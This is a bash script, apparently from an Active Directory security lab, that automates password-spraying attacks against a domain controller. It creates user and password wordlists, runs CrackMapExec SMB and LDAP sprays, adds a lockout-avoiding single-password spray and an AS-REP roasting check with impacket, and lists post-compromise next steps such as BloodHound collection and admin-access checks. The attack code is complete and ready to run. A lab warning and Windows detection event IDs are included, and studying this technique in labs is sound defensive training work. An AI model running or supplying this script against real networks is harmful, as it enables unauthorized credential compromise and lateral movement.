#!/bin/bash
#
# Password Spraying Script for AD Security Lab
# Author: AD Security Lab
# Description: Password spray attacks against AD
#
# Usage: ./password-spray.sh [target_ip] [domain]
#

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
DC_IP="${1:-192.168.1.100}"
DOMAIN="${2:-yourcompany.local}"
OUTPUT_DIR="$HOME/ad-lab-spray"
USER_FILE="$OUTPUT_DIR/users.txt"
PASS_FILE="$OUTPUT_DIR/passwords.txt"

# Banner
echo -e "${RED}"
echo "=========================================="
echo "  AD Security Lab - Password Spraying"
echo "=========================================="
echo -e "${NC}"
echo -e "${YELLOW}WARNING: Only use in authorized lab environments!${NC}"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Ensure user and password files exist
if [ ! -f "$USER_FILE" ]; then
    echo -e "${BLUE}[*] Creating user wordlist...${NC}"
    cat > "$USER_FILE" << 'EOF'
jsmith
jdoe
bwilson
admin.user
svc_sql
administrator
guest
EOF
    echo -e "${GREEN}[+] Created: $USER_FILE${NC}"
fi

if [ ! -f "$PASS_FILE" ]; then
    echo -e "${BLUE}[*] Creating password wordlist...${NC}"
    cat > "$PASS_FILE" << 'EOF'
Password123!
Summer2024!
Welcome1!
Company2024!
AdminP@ss1!
SQLService123!
EOF
    echo -e "${GREEN}[+] Created: $PASS_FILE${NC}"
fi

echo ""
echo -e "${CYAN}Target: $DC_IP${NC}"
echo -e "${CYAN}Domain: $DOMAIN${NC}"
echo ""

# ============================================
# Method 1: SMB Password Spray
# ============================================
echo -e "${YELLOW}[*] Method 1: SMB Password Spray${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Running CrackMapExec SMB spray...${NC}"
echo -e "${BLUE}[*] This may take a while...${NC}"
echo ""

# Run spray and save results
crackmapexec smb "$DC_IP" -u "$USER_FILE" -p "$PASS_FILE" --continue-on-success 2>/dev/null | tee "$OUTPUT_DIR/smb_spray_results.txt"

echo ""
echo -e "${GREEN}[+] SMB spray results saved to $OUTPUT_DIR/smb_spray_results.txt${NC}"

# Extract successful logins
echo ""
echo -e "${YELLOW}[*] Checking for successful logins...${NC}"
grep -E "\[\+\]" "$OUTPUT_DIR/smb_spray_results.txt" 2>/dev/null || echo -e "${YELLOW}    No successful logins found${NC}"
echo ""

# ============================================
# Method 2: LDAP Password Spray
# ============================================
echo -e "${YELLOW}[*] Method 2: LDAP Password Spray${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Running CrackMapExec LDAP spray...${NC}"

crackmapexec ldap "$DC_IP" -u "$USER_FILE" -p "$PASS_FILE" --continue-on-success 2>/dev/null | tee "$OUTPUT_DIR/ldap_spray_results.txt"

echo ""
echo -e "${GREEN}[+] LDAP spray results saved to $OUTPUT_DIR/ldap_spray_results.txt${NC}"
echo ""

# ============================================
# Method 3: Single Password Spray (Stealthier)
# ============================================
echo -e "${YELLOW}[*] Method 3: Single Password Spray (Stealthier)${NC}"
echo "--------------------------------------"

# Spray one password at a time (better for avoiding lockouts)
SINGLE_PASS="Password123!"

echo -e "${BLUE}[*] Spraying single password: $SINGLE_PASS${NC}"
crackmapexec smb "$DC_IP" -u "$USER_FILE" -p "$SINGLE_PASS" --continue-on-success 2>/dev/null
echo ""

# ============================================
# Method 4: Kerberos Pre-Auth Spray (Quietest)
# ============================================
echo -e "${YELLOW}[*] Method 4: Kerberos Pre-Auth Check${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Checking for users without Kerberos pre-authentication...${NC}"
echo -e "${BLUE}[*] (AS-REP Roasting preparation)${NC}"
echo ""

# Check which users don't require pre-auth
impacket-GetNPUsers "$DOMAIN/" -usersfile "$USER_FILE" -dc-ip "$DC_IP" -format hashcat 2>/dev/null | tee "$OUTPUT_DIR/asrep_check.txt"

echo ""

# ============================================
# Summary
# ============================================
echo -e "${BLUE}"
echo "=========================================="
echo "  Password Spray Complete"
echo "=========================================="
echo -e "${NC}"

echo -e "${YELLOW}Results saved to:${NC}"
echo "  - $OUTPUT_DIR/smb_spray_results.txt"
echo "  - $OUTPUT_DIR/ldap_spray_results.txt"
echo "  - $OUTPUT_DIR/asrep_check.txt"
echo ""

echo -e "${YELLOW}Successful credentials found:${NC}"
grep -h -E "\[\+\]" "$OUTPUT_DIR"/*.txt 2>/dev/null | sort -u || echo "  None found"
echo ""

echo -e "${YELLOW}Detection Notes:${NC}"
echo "  - Event ID 4625: Failed logon attempts"
echo "  - Event ID 4771: Kerberos pre-auth failed"
echo "  - Pattern: Multiple users, few passwords, short timeframe"
echo ""

echo -e "${YELLOW}Next Steps (if credentials found):${NC}"
echo "  # Enumerate with valid creds"
echo "  crackmapexec smb $DC_IP -u 'USER' -p 'PASS' --shares"
echo ""
echo "  # Run BloodHound"
echo "  bloodhound-python -u 'USER' -p 'PASS' -d $DOMAIN -ns $DC_IP -c All"
echo ""
echo "  # Check local admin access"
echo "  crackmapexec smb 192.168.1.100-102 -u 'USER' -p 'PASS'"
echo ""
